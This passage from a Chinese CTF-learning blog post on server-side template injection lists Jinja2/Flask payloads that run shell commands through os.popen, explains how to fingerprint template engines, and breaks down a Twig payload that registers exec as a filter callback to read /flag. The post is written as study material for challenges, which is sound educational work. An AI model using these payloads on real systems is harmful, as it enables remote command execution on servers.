class="line">&#123;&#123;joiner.__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;namespace.__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;url_for.__globals__.current_app.add_url_rule(&#x27;/1333337&#x27;,view_func=url_for.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>ps:QAQ好抽象</p>
+<h2 id="二编"><a class="markdownIt-Anchor" href="#二编"></a> 二编：</h2>
+<p><img src="https://img2024.cnblogs.com/blog/3450162/202407/3450162-20240717154937641-936215290.png" alt="image" /></p>
+<p>这里再补充一下：常见模板有Smarty、Mako、Twig、Jinja2、Eval、Flask、Tornado、Go、Django、Ruby等。</p>
+<p>这幅图的含义是通过这些指令去判断对方用的是什么模板，下面解释一下这幅图的意思:<br />
+绿色箭头是执行成功，红色箭头是执行失败。<br />
+首先是注入<code>$&#123;7*7&#125;</code>没有回显出49的情况，这种时候就是执行失败走红线，再次注入49如果还是没有回显49就代表这里没有模板注入；如果注入回显了49代表执行成功，继续往下走注入49，如果执行成功回显7777777说明是jinja2模板，如果回显是49就说明是Twig模板。<br />
+然后回到最初注入<code>$&#123;7＊7&#125;</code>成功回显出49的情况，这种时候是执行成功走绿线，再次注入a{<em>comment</em>}b，如果执行成功回显ab，就说明是Smarty模板；如果没有回显出ab，就是执行失败走红线，注入${“z”.join(“ab”)}，如果执行成功回显出zab就说明是Mako模板。实际做题时也可以把指令都拿去测测看谁能对上。平时做题也可以多搜集不同模板对应的注入语句语法。</p>
+<h3 id="常见payload"><a class="markdownIt-Anchor" href="#常见payload"></a> 常见payload：</h3>
+<p>1.Twig模版：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">先找到flag位置</span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;find / -name &#x27;f*&#x27;&quot;)&#125;&#125;</span><br><span class="line">再</span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>将Payload分成两部分来理解：<br />
+<code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;</code><br />
+<code>&#123;&#123;_self.env.getFilter("cat /flag")&#125;&#125;</code></p>
+<p>第一部分：设置恶意回调<br />
+<code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;</code><br />
+<code>_self:</code><br />
+在<code>Twig</code>模板中，<code>_self</code>是一个特殊的变量，它指向当前的模板上下文（Twig\Template实例）。通过它可以访问到模板内部的一些方法和属性。<br />
+<code>_self.env:</code><br />
+<code>env</code>是<code>_self</code>的一个属性，它指的是<code>Twig</code>的环境对象（Twig\Environment实例）。这个对象包含了模板引擎的所有配置、扩展、过滤器、函数等全局信息。控制了它，就相当于控制了模板引擎的核心。<br />
+<code>registerUndefinedFilterCallback:</code><br />
+这是<code>Twig\Environment</code>对象的一个方法。<br />
+它的作用是：注册一个回调函数。当Twig在模板中遇到一个未被定义的过滤器时，就会自动调用这个注册好的回调函数，而不是直接抛错。</p>
+<p>这行代码的执行结果是——告诉<code>Twig</code>引擎：“以后如果你遇到任何不认识的过滤器，别报错，去调用<code>exec</code>函数来处理”。</p>
+<p>第二部分：触发命令执行<br />
+<code>&#123;&#123;_self.env.getFilter("cat /flag")&#125;&#125;</code></p>
+<ol start="2">
+<li></li>
+</ol>
+<p>本文参考资料：<a target="_blank" rel="noopener" href="https://hello-ctf.com/hc-web/ssti/#_3">SSTI 注入 - Hello CTF</a></p>
+
+    </div>
+    <footer class="article-footer">
+        <blockquote class="article-copyright">
+    <p><strong><span class="icon-user icon"></span>Author: </strong>Cl1ck-t0</p>
+    <p><strong><span class="icon-link icon"></span>Permalink: </strong><a href="https://cl1ck-t0.github.io/2026/03/13/SSTI%E6%B3%A8%E5%85%A5/">https://cl1ck-t0.github.io/2026/03/13/SSTI%E6%B3%A8%E5%85%A5/</a></p>
+    
+    <p><strong><span class="icon-calendar icon"></span>Published: </strong>2026-03-13 09:54:17</p>
+    <p><strong><span class="icon-calendar icon"></span>Updated: </strong>2026-03-22 14:38:17</p>
+    <p><strong><span class="icon-copyright icon"></span>License: </strong>All articles on this blog are licensed under the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener nofollow noreferrer" target="_blank"><span class="icon-creative-commons"></span>BY-NC-SA</a> license agreement unless otherwise stated. Please indicate the source when reprinting!</p>
+    <span class="icon-creative-commons article-copyright-bg"></span>
+  </blockquote>
+        <div class="share-wrapper">
+    <a href="https://service.weibo.com/share/share.php?url=https%3A%2F%2Fcl1ck-t0.github.io%2F2026%2F03%2F13%2FSSTI%25E6%25B3%25A8%25E5%2585%25A5%2F&amp;appkey=&amp;title=SSTI%E6%B3%A8%E5%85%A5&amp;pic=&amp;ralateUid=" target="_blank" rel="noopener noreferrer" title="SSTI注入">
+      <div class="share-icon icon icon-weibo">
+      </div>
+    </a>
+    <a href="https://connect.qq.com/widget/shareqq/index.html?url=www.baidu.com&amp;title=SSTI%E6%B3%A8%E5%85%A5&amp;desc=SSTI%E6%B3%A8%E5%85%A5&amp;source=https%3A%2F%2Fcl1ck-t0.github.io" target="_blank" rel="noopener noreferrer" title="SSTI注入">
+      <div class="share-icon icon icon-qq">
+      </div>
+    </a>
+    <a href="javascript:;"  title="SSTI注入">
+      <div class="share-icon icon icon-weixin">
+          <div id="share-weixin">
+            <div class="share-weixin-dom">
+              <div class="share-weixin-content">
+                <img id="share-weixin-banner"> 
+                <div id="share-weixin-title"></div>
+                <div id="share-weixin-desc"></div>
+              </div>
+              <div class="share-weixin-qrcode">
+                <div class="share-weixin-info">
+                  <div id="share-weixin-author"></div>
+                  <div id="share-weixin-theme">Powered By hexo-theme-reimu</div>
+                </div>
+                <img id="share-weixin-qr" >
+              </div>
+            </div>
+            <div class="share-weixin-canvas"></div>
+          </div>
+      </div>
+    </a>
+</div>
+      
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/web/" rel="tag" title="web">web</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/web%E6%BC%8F%E6%B4%9E/" rel="tag" title="web漏洞">web漏洞</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/covers/bed021fca5f9e9999912f57fa476faf9.jpg" data-sizes="auto" alt="burp靶场漏洞实战" class="lazyload">
+        <a href="/2026/03/31/burp%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98/" aria-label="Prev: burp靶场漏洞实战" title="Prev: burp靶场漏洞实战"></a>
+        <div class="article-nav-caption">Prev</div>
+        <h3 class="article-nav-title">
+            burp靶场漏洞实战
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/covers/genshin-impact-hot-3840x2160-21459.jpg" data-sizes="auto" alt="变量覆盖漏洞" class="lazyload">
+      <a href="/2026/03/05/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/" aria-label="Next: 变量覆盖漏洞"  title="Next: 变量覆盖漏洞"></a>
+      <div class="article-nav-caption">Next</div>
+      <h3 class="article-nav-title">
+          变量覆盖漏洞
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+  <section id="comments" data-aos="fade-up">
+    <div class="comment-header">
+        
+      <h2 class="comment-title">Leave a comment</h2>
+      <div class="comment-selector">
+        <div class="comment-selector-wrap">
+            <div class="selector-item" data-selector="utterances">
+              <span>utterances</span>
+            </div>
+        </div>
+      </div>
+    </div>
+    <div class="comment-content">
+          <div class="comment utterances-comment" data-aos="fade-up"
+            id="utterances-comment">
+          </div>
+    </div>
+  </section>
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        &nbsp;
+      Cl1ck-t0
+    </div>
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        67.8k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        05:11
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ssti%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text"> SSTI注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80"><span class="toc-number">1.1.</span> <span class="toc-text"> 一、前置基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-ssti%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text"> 二、SSTI注入流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E7%94%A8-payload-python3"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 通用 payload ( Python3 )</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E7%BC%96"><span class="toc-number">1.3.</span> <span class="toc-text"> 二编：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81payload"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 常见payload：</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Cl1ck-t0" class="lazyload">
+  <div class="sidebar-author-name">Cl1ck-t0</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">32</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">20</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-rss sidebar-social-icon">
+      <a href=/atom.xml itemprop="url" target="_blank" aria-label="rss" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/atom.xml" aria-label="rss"></a>
+        <div class="sidebar-menu-link">rss</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+  
+<script src="https://npm.webcache.cn/theme-shokax-pjax@0.0.3/dist/index.umd.js" integrity="sha384-xneY1WY8hOfUzswrE4CrYq35N4BdVcxqxwHPr9zawE&#x2F;jMSCxD+jAPU55x&#x2F;jj3wlf" crossorigin="anonymous"></script>
+
+  
+<script src="/js/pjax.js"></script>
+
+
+
+
+  
+<script src="https://npm.webcache.cn/quicklink@3.0.1/dist/quicklink.umd.js" integrity="sha384-caMDqvgav&#x2F;HWdEYQU1QRRHMLleigpL1YHAG0m371DhzfL8rRzUyOb+bEHtwlmYjD" crossorigin="anonymous"></script>
+
+  <script data-pjax>
+    window.quicklink?.listen({
+      timeout: 3000,
+      priority: true,
+      ignores: []
+    });
+  </script>
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "Cl1ck-t0",
+          title: "SSTI注入",
+          url: "https://cl1ck-t0.github.io/2026/03/13/SSTI%E6%B3%A8%E5%85%A5/",
+          excerpt: "",
+          description: "",
+          stripContent: " SSTI注入 简述：SSTI（Server-Side Template Injection） 服务器端模板注入，攻击者能够向服务器端模板引擎注入恶意模板代码，从而在服务器端执行任意代码。  一、前置基础 首先我们要知道什么是模板。 模板 是一种用于生成动态内容的工具。 它们通常包含两个基本部分：静态内容和动态占位符。 如图：绿色 部分为 静态内容 ，而 橙色 部分则是 动态占位符  模板的主要作用是分离业务逻辑和展示逻辑，使得前端开发者和后端开发者可以并行工作，同时也使得代码更易于维护。 静态",
+          date: "Fri Mar 13 2026 09:54:17 GMT+0800",
+          updated: "Sun Mar 22 2026 14:38:17 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/js/tabs.js" data-pjax defer></script>
+
+        
+<script src="https://npm.webcache.cn/@zumer/snapdom@1.9.14/dist/snapdom.min.js" integrity="sha384-OEQ+fJp&#x2F;Mvi2uzBREXybtxryJvLytWapuHu4EE6LPwTKUwATYcc55tPPcZTzVcmx" crossorigin="anonymous" defer data-pjax></script>
+
+        
+<script src="https://npm.webcache.cn/qrcode@1.5.1/build/qrcode.js" integrity="sha384-VT1EeewTCEXgndcPMQ0PzV+uVFYjxFIjmAA7s5gcMX9t4Dt5TD+OVQIn7NJWIXn7" crossorigin="anonymous" defer data-pjax></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+<script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+
+  var commentConfigKeys = ["utterances"];
+  var commentConfig = {
+    utterances: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.utterances-comment'); 
+        if (!container) return;
+        container.style.display = 'block';
+
+        let theme = 'auto';
+        const parsedTheme = theme === 'auto' ? (document.documentElement.getAttribute('data-theme') === 'dark' ? 'github-dark' : 'github-light') : theme;
+
+        // 创建 utterances 脚本
+        const script = document.createElement('script');
+        script.src = 'https://utteranc.es/client.js';
+        script.setAttribute('repo', 'Cl1ck-t0/Cl1ck-t0.github.io');
+        script.setAttribute('issue-term', 'title');
+        script.setAttribute('theme', parsedTheme);
+        script.setAttribute('crossorigin', 'anonymous');
+        script.async = true;
+
+        // 清空容器（防止重复加载）并插入脚本
+        container.innerHTML = '';
+        container.appendChild(script);
+        if (theme === 'auto') {
+          const themeHandler = (e) => {
+            const iframe = container.querySelector('iframe.utterances-frame');
+            if (!iframe || !iframe.contentWindow) {
+              document.body.removeEventListener('reimu:theme-set', themeHandler);
+              return;
+            }
+            iframe.contentWindow.postMessage({ type: 'set-theme', theme: e.detail.isDark ? 'github-dark' : 'github-light' }, 'https://utteranc.es');
+          };
+          document.body.addEventListener('reimu:theme-set', themeHandler);
+        }
+      }
+    },
+  }
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig[key].enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    // 1. 首先检查localStorage中是否有保存的评论类型
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    // 2. 如果localStorage中有值且对应的评论系统可用，就使用它
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    // 3. 如果localStorage无效，检查配置的默认评论系统
+    if (!defaultComment) {
+      var configDefault = 'waline';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    // 4. 如果前两项都无效，按指定顺序找到第一个可用的评论系统
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig[sys].enable) || '';
+    }
+  }
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    // 隐藏所有评论容器
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    // 按需加载评论系统
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        // 如果已加载，只需显示对应容器
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      // 根据类型加载对应的脚本
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    // 评论组件选择器
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      // 获取要加载的评论系统类型
+      const commentType = item.getAttribute('data-selector');
+
+      // 隐藏所有评论系统
+      hideAllComments();
+
+      // 加载选中的评论系统
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      // 评论组件选择器点击事件
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          // 保存选择器状态
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          // 切换选中状态
+          changeActiveCommentItems(item);
+        });
+      }
+
+      // 检查是否需要加载默认评论系统
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script>
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+    <script>
+      var setupAPlayer = () => {
+        if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+          if (window.matchMedia('(max-width: 959px)').matches) {
+            const meting = _$('meting-js');
+            if (meting) {
+              meting.setAttribute('fixed', 'true');
+              const aside = meting.parentNode?.parentNode;
+              if (aside?.tagName === 'ASIDE') {
+                meting.parentNode.removeChild(meting);
+                document.body.appendChild(meting);
+              }
+            }
+          }
+        }
+      };
+    </script>
+  
+<script src="https://npm.webcache.cn/aplayer@1.10.1/dist/APlayer.min.js" integrity="sha384-gdGYZwHnfJM54evoZhpO0s6ZF5BQiybkiyW7VXr+h5UfruuRL&#x2F;aORyw+5+HZoU6e" crossorigin="anonymous" defer onload="setupAPlayer()"></script>
+
+    
+<script src="https://npm.webcache.cn/meting@2.0.1/dist/Meting.min.js" integrity="sha384-ASVlpKF80A22OXTK3tfEjZm1EL6uFMKIC4p8+0maanw1S&#x2F;IyB+Y4JG+ZDU7GpKE8" crossorigin="anonymous" defer></script>
+
+
+
+  </body>
+  </html>
